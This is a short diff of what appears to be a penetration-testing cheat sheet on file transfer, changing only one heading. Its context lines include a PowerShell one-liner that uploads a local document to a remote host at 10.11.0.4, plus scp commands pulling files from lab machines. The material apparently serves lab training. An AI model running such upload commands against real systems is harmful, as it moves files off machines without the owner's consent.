@@ -38,7 +38,7 @@ sudo chown www-data: /var/www/uploads
 powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'Path/important.docx')
 ```
 
-### SCP Copy file from remote machine to local tmp
+### SCP Copy file from remote machine to local tmp (Linux to Linux)
 scp john@localhost:/var/tmp/CopyMe.txt /tmp  
 scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2  
 scp -P 2222 student@192.168.79.112:/usr/share/kali-defaults/web/img/password.png /home/kali/
